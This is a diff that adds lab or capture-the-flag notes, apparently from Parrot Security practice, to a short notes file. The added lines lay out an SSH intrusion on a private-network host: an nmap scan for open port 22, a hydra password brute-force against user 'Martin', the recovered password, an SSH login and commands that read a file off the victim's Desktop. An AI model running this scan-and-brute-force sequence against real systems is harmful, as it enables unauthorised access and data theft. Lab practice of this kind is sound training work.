@@ -35,3 +35,17 @@ parrot secuity
 find ~ -name "username.txt"
 ls -l ~/username.txt
 
+
+
+
+
+- nmap -p 22 192.168.10.0/24 --open
+- hydra -l Martin -P password.txt 192.168.10.101
+- Password: qwerty1234
+- ssh Martin@192.168.10.101   enter password and get the file
+cd Desktop
+Dir
+type $ollers.txt
+more $ollers.txt
+bye
+
